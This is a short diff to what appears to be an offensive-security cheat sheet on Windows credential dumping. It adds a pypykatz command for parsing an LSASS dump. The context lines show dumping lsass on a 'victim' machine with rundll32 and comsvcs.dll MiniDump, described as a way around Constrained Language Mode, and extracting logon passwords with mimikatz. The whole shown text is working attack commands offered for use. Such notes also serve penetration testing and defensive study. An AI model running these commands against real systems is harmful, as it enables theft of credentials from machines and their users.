@@ -124,6 +124,9 @@ This method will bypass CLM to dump lsass since we are using MS signed binary (w
 # Run this in victim/remote computer
 rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\Windows\Tasks\lsass.dmp full
 
+# Use pypykatz
+pypykatz lsa minidump lsass.dmp
+
 # Use mimikatz's minidump 
 mimikatz# sekurlsa::minidump <Path_to_file>\lsass.dmp
 mimikatz# sekurlsa::logonpasswords
